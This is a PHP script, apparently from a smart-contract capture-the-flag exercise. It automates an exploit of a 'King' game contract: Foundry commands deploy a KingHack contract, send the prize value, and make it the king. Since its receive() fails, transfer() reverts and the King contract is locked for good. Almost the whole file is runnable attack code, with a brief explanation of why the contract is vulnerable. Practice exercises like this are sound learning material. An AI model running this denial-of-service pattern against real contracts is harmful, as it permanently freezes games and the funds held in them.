<?php
include "prepare.php";

// ---------------------------------------------------------------
// Utility: convert 32-byte padded hex  decimal
// ---------------------------------------------------------------
function hexToDec($hex) {
    $hex = trim($hex);
    if (str_starts_with($hex, "0x")) {
        $hex = substr($hex, 2);
    }
    // remove left padding
    $hex = ltrim($hex, "0");
    if ($hex === "") return 0;
    return hexdec($hex);
}

if (!$_POST):
?>
<pre>
<b>Why King.sol is vulnerable?</b>

King pays the previous king with:
    payable(king).transfer(msg.value);

If the new king is a contract with a failing receive() function,
then transfer() always reverts, permanently locking the game.

This script:
1. Deploys KingHack
2. Sends >= prize to become king
3. Locks the King contract forever
</pre>
<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "King Contract: $CONTRACT\n";
echo "Player Index:  $PLAYER_ID\n";
echo "Player Addr:   $PLAYER\n\n";


// ---------------------------------------------------------------
// READ CURRENT PRIZE
// ---------------------------------------------------------------
echo "=== CURRENT PRIZE ===\n";
$prizeHex = trim(cast("cast call $CONTRACT \"prize()\" --rpc-url $RPC"));
$prize = hexToDec($prizeHex);

echo "Prize (hex): $prizeHex\n";
echo "Prize (wei): $prize\n";


// ---------------------------------------------------------------
// DEPLOY KingHack.sol
// ---------------------------------------------------------------
echo "\n=== DEPLOYING KingHack ===\n";

$cmd1 =
"forge create --json --broadcast src/KingHack.sol:KingHack " .
"--value 1 " .
"--private-key $PK --rpc-url $RPC";

$raw = cast($cmd1);
echo $raw . "\n";

$hack = null;

// JSON output regex
if (preg_match('/"deployedTo"\s*:\s*"(0x[0-9A-Fa-f]{40})"/', $raw, $m)) {
    $hack = $m[1];
}
// Text fallback
elseif (preg_match('/Deployed to:\s*(0x[0-9A-Fa-f]{40})/', $raw, $m)) {
    $hack = $m[1];
}

if (!$hack) {
    echo "\nERROR: Could not deploy KingHack\n";
    exit;
}

echo "KingHack deployed at: $hack\n";


// ---------------------------------------------------------------
// EXECUTE KING ATTACK
// ---------------------------------------------------------------
echo "\n=== EXECUTING KING ATTACK ===\n";

echo "Sending $prize wei to become the new King...\n";

$cmdAttack =
"cast send $hack \"attack(address)\" $CONTRACT " .
"--value $prize " .
"--rpc-url $RPC --private-key $PK";

echo cast($cmdAttack);


// ---------------------------------------------------------------
// CHECK NEW KING
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== NEW KING AFTER EXPLOIT ===
</div>";

echo cast("cast call $CONTRACT \"_king()\" --rpc-url $RPC");

echo "</pre>";
?>
